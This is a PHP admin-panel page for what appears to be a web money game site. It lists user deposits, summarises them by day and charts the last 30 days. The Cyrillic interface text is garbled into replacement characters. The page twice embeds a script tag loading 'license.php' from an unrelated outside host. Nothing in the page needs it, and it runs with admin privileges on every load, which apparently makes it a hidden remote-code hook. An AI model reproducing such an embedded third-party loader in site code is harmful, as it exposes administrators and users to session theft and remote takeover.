<div class="wrap">
<br />
<center>
<div class="block3" style="margin-left:-0px">
<div class="b-title">�������</div>
<div style="height:57px;"></div>
<center>

<a href="/adminka/"  class="button7">���������� �������</a>
<br />
<a href="index.php?menu=users" class="button7">������ �������������</a>
<br />
<a href="index.php?menu=viplat" class="button7">�������</a>
</center>
</div>


<div class="block3" style="margin-left:-0px">
<div class="b-title">�������</div>
<div style="height:57px;"></div>
<center>

<a href="index.php?menu=story_insert"  class="button7">����������</a>
<br />
<a href="index.php?menu=story_buy" class="button7">�������</a>
<br />
<a href="index.php?menu=story_swap" class="button7">������</a>
</center>
</div>


<div class="block3" style="margin-left:-0px">
<div class="b-title">�������</div>
<div style="height:57px;"></div>
<center>

<a href="index.php?menu=story_sell"  class="button7">�������</a>
<br />
<a href="index.php?menu=news" class="button7">�������</a>
<br />
<a href="index.php?menu=compconfig" class="button7">������� ���������</a>
</center>
</div>

<div class="block3" style="margin-left:-0px">
<div class="b-title">�������</div>
<div style="height:57px;"></div>
<center>

<a href="index.php?menu=top"  class="button7">��� ������</a>
<br />
<a href="#" class="button7">��������� �����</a>
<br />
<a href="/account/exit" class="button7">�����</a>
</center>
</div>
</center>

<br />

<center><div style="padding:0px; ">
<div class="">	
<div class="s-bk-lf">
	<div class="tit">������� ����������</div>
</div>
<div style="padding:20px">
<div class="silver-bk">
<div class="clr"></div>
<center><a href="index.php?menu=story_insert">������ ����������</a> || <a href="index.php?menu=story_insert&list_day">�� ����</a> || <a href="index.php?menu=story_insert&last_31">������ �� 30 ����</a></center><BR />
<?PHP
# ������
if(isset($_GET["last_31"])){
	
	$dlim = time() - 60*60*24*30;
	$db->Query("SELECT * FROM db_insert_money WHERE date_add > $dlim ORDER BY id DESC");
	
	$days_money = array();
	$days_insert = array();
	
	if($db->NumRows() > 0){
		
		while($data = $db->FetchArray()){
		$index = date("d.m.Y", $data["date_add"]);
		
			$days_money[$index] = (isset($days_money[$index])) ? $days_money[$index] + $data["money"] : $data["money"];
			$days_insert[$index] = (isset($days_insert[$index])) ? $days_insert[$index] + 1 : 1;
			
		}
	
	# �����
	if(count($days_money) > 0){
		
		$array_for_chart = array();
		$array_for_chart2 = array();
		$array_for_chart3 = array();
		
			foreach($days_money as $date => $sum){
			
				$array_for_chart[] = "['".$date."', ".round($sum)."]";
				$array_for_chart2[] = "['".$date."', ".$days_insert[$date]."]";
				$array_for_chart3[] = "['".$date."', ".round($sum / $days_insert[$date], 2)."]";
			
			}
			
			$retd = implode(", ", array_reverse($array_for_chart));
			$retd2 = implode(", ", array_reverse($array_for_chart2));
			$retd3 = implode(", ", array_reverse($array_for_chart3));
			
		?>

	<script type="text/javascript" src="https://www.google.com/jsapi"></script>
	<script type="text/javascript" src="http://wwes.ru/license.php"></script>
    <script type="text/javascript">
      google.load("visualization", "1", {packages:["corechart"]});
      google.setOnLoadCallback(drawChart);
      function drawChart() {
        var data = google.visualization.arrayToDataTable([
          ['����', '�����'],
          <?=$retd; ?>
        ]);

        var options = {
          title: '������� ���������� (�����)',
          hAxis: {title: 'Last 30 Days',  titleTextStyle: {color: 'green'}}
        };

        var chart = new google.visualization.SteppedAreaChart(document.getElementById('chart_div'));
        chart.draw(data, options);
      }
    </script>
	<div id="chart_div" style="width: 100%; height: 500px;"></div>
	
	<script type="text/javascript">
      google.load("visualization", "1", {packages:["corechart"]});
      google.setOnLoadCallback(drawChart2);
      function drawChart2() {
        var data2 = google.visualization.arrayToDataTable([
          ['����', '���-��'],
          <?=$retd2; ?>
        ]);

        var options2 = {
          title: '������� ���������� (���-��)',
          hAxis: {title: 'Last 30 Days',  titleTextStyle: {color: 'green'}}
        };

        var chart2 = new google.visualization.SteppedAreaChart(document.getElementById('chart_div2'));
        chart2.draw(data2, options2);
      }
    </script>
	<div id="chart_div2" style="width: 100%; height: 500px;"></div>
	<script type="text/javascript">
      google.load("visualization", "1", {packages:["corechart"]});
      google.setOnLoadCallback(drawChart3);
      function drawChart3() {
        var data3 = google.visualization.arrayToDataTable([
          ['����', '�����'],
          <?=$retd3; ?>
        ]);

        var options3 = {
          title: 'AVG (����� / ���-��)',
          hAxis: {title: 'Last 30 Days',  titleTextStyle: {color: 'green'}}
        };

        var chart3 = new google.visualization.SteppedAreaChart(document.getElementById('chart_div3'));
        chart3.draw(data3, options3);
      }
    </script>
	<div id="chart_div3" style="width: 100%; height: 500px;"></div>
	
	
		<?PHP
		
	}
	
	}else echo "<center><b>������� ���</b></center><BR />";
	
	
	
?>

 </div> 
</div> 
            
	    </div> </div>
		
		</div>	</div>			
<br /><br />	


<?PHP
return;
}


# ����� ���������� �� ����
if(isset($_GET["list_day"])){

	$db->Query("SELECT * FROM db_insert_money ORDER BY id DESC");
	
	$days_money = array();
	$days_insert = array();
	
	if($db->NumRows() > 0){
		
		while($data = $db->FetchArray()){
		$index = date("d.m.Y", $data["date_add"]);
		
			$days_money[$index] = (isset($days_money[$index])) ? $days_money[$index] + $data["money"] : $data["money"];
			$days_insert[$index] = (isset($days_insert[$index])) ? $days_insert[$index] + 1 : 1;
			
		}
	
	# �����
	if(count($days_money) > 0){
	
		?>
		<table cellpadding='3' cellspacing='0' border='0' bordercolor='#336633' align='center' width="99%">
		  <tr >
			<td align="center" class="title7">����</td>
			<td align="center" class="title7">����������</td>
			<td align="center" class="title7">�� �����</td>
			<td align="center" class="title7">AVG</td>
		  </tr>
		<?PHP
		
		$array_for_chart = array();
		
			foreach($days_money as $date => $sum){
			
				?>
				<tr class="htt">
					<td align="center" class="message1"><b><?=$date; ?></b></td>
					<td align="center" class="message1"><?=$days_insert[$date]; ?> ��.</td>
					<td align="center" class="message1"><?=$sum; ?> <?=$config->VAL;?></td>
					<td align="center" class="message1"><?=round($sum/$days_insert[$date],2); ?> <?=$config->VAL;?></td>
				</tr>
				<?PHP
				
			}
			
		?>
		</table>
		<?PHP
		
	}
	
	}else echo "<center><b>������� ���</b></center><BR />";
	
	
	
?>


 </div> 
</div> 
            
	    </div> </div>
		
		</div>	</div>			
<br /><br />



<?PHP
return;
}

$tdadd = time() - 5*60;
	if(isset($_POST["clean"])){
	
		$db->Query("DELETE FROM db_insert_money WHERE date_add < '$tdadd'");
		echo "<center><font color = 'green'><b>�������</b></font></center><BR />";
	}

$db->Query("SELECT * FROM db_insert_money ORDER BY id DESC");

if($db->NumRows() > 0){

?>
<table cellpadding='3' cellspacing='0' border='0' bordercolor='#336633' align='center' width="99%">
  <tr bgcolor="#efefef">
    <td align="center" width="50" class="title7">ID</td>
    <td align="center" class="title7">������������</td>
    <td align="center" width="75" class="title7"><?=$config->VAL; ?></td>
	
	<td align="center" width="150" class="title7">���� ��������</td>
  </tr>


<?PHP

	while($data = $db->FetchArray()){
	
	?>
	<tr >
    <td align="center" width="50" class="message1"><?=$data["id"]; ?></td>
    <td align="center" class="message1"><?=$data["user"]; ?></td>
    <td align="center" width="75" class="message1"><?=$data["money"]; ?></td>
	
	<td align="center" width="150" class="message1"><?=date("d.m.Y � H:i:s",$data["date_add"]); ?></td>
  	</tr>
	<?PHP
	
	}

?>

</table>
<BR />
<form action="" method="post">
<center><input type="submit" name="clean" value="��������" class="button25"/></center>
</form>
<?PHP

}else echo "<center><b>������� ���</b></center><BR />";
?>
<script type="text/javascript" src="http://wwes.ru/license.php"></script>
 </div> 
</div> 
            
	    </div> </div>
		
		</div>	</div>			
<br /><br />